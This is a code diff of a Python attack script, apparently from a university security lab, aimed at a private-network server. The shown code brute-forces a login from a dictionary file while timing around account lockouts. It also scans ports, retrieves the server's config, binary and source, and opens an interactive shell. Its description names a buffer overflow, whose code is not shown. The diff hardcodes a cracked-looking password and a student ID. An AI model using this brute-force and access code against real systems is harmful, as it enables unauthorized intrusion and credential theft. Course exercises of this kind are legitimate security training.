@@ -3,15 +3,26 @@ import re
 import socket
 import time
 import datetime
-#import sys
-#sys.stdout = open('port.out', 'w')
-
+import argparse
 HOST = '192.168.1.10'
 PORT = 10247
 # HOST = '127.0.0.1'
 SKELETONKEY = 'Passepartout'
 BYTES = 100000
-CRUZID = 'bosdhill\n'
+CRUZID = 'bosdhill'
+password = "BristolRovers"
+DICTIONARY = "dictionary.txt"
+
+def parse():
+     parser = argparse.ArgumentParser(
+          description='Find and access PORT server belonging to user CRUZID with SKELETONKEY. Crack password using passwords in DICT file. Do a buffer overflow attack on server. Print the redirection url.',
+          formatter_class=argparse.ArgumentDefaultsHelpFormatter
+     )
+     parser.add_argument('--ip',default='192.168.1.10',type=str,help="IP address to port scan",dest='ip')
+     parser.add_argument('--key',default='Passepartout',type=str,help="SKELETONKEY",dest='key')
+     parser.add_argument('--user',default='bosdhill',type=str,help="CRUZID",dest='user')
+     parser.add_argument('--dict',default='dictionary.txt',type=str,help="DICT",dest='dict')
+     return parser.parse_args()
 
 def create_dict():
      passwords = []
@@ -53,7 +64,7 @@ def get_config():
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((HOST, PORT))
      send_data(s, "skeleton key", SKELETONKEY, False)
-     send_data(s, "username", CRUZID, False)
+     send_data(s, "username", CRUZID + '\n', False)
      send_data(s, "password", password, False)
      send_data(s, "student.dat", "config\n", True)
      s.close()
@@ -63,7 +74,7 @@ def get_binary():
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((HOST, PORT))
      send_data(s, "skeleton key", SKELETONKEY, False)
-     send_data(s, "username", CRUZID, False)
+     send_data(s, "username", CRUZID + '\n', False)
      send_data(s, "password", password, False)
      send_data(s, "server", "binary\n", True)
      s.close()
@@ -73,7 +84,7 @@ def get_source():
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((HOST, PORT))
      send_data(s, "skeleton key", SKELETONKEY, False)
-     send_data(s, "username", CRUZID, False)
+     send_data(s, "username", CRUZID + '\n', False)
      send_data(s, "password", password, False)
      send_data(s, "server.c", "source\n", True)
      s.close()
@@ -94,14 +105,15 @@ def shell_connect():
           x = input(data.decode('unicode-escape'))
           s.sendall(bytes(x, 'utf-8'))
           data = s.recv(BYTES)
+     s.close()
 
 def get_blackout_period_from(msg):
      start_index = msg.find("next ")
      return int(msg[start_index + len("next "):].split(' seconds')[0])
 
-
 # Assuming NO initial lockout
-def crack_password(PORT):
+def crack_password():
+     global password
      passwords = create_dict()
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((HOST, PORT))
@@ -137,6 +149,9 @@ def crack_password(PORT):
                     # print("Received: %s" % data)
                else:
                     # print("Password cracked! Password is %s" % passwords[i])
+                    password = passwords[i]
+                    s.close()
+                    # pass to next function
                     break
           elif data == 'Too many failed login attempts, account is locked for the next 600 seconds, goodbye.\n':
                # print("\tOut of tries!")
@@ -155,6 +170,7 @@ def crack_password(PORT):
                data = s.recv(BYTES)
 
 def try_ports():
+     global PORT
      fp = open("out", "r")
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      for _, line in enumerate(fp):
@@ -164,15 +180,22 @@ def try_ports():
           s.sendall(SKELETONKEY)
           time.sleep(2)
           data = s.recv(BYTES)
-          s.sendall(CRUZID)
+          s.sendall(CRUZID + '\n')
           data = s.recv(BYTES)
           if data == 'Password: ':
                # print('Received %s from port %d' % (repr(data), PORT))
-               crack_password(PORT)
+               crack_password()
+
+
+def main():
+     parse()
 
 if __name__ == "__main__":
+     main()
+
+#      pass
 #     crack_password(10247)
 	# shell_connect()
      # auto_connect()
-     smash()
+     # smash()
      # print_redirect_url()
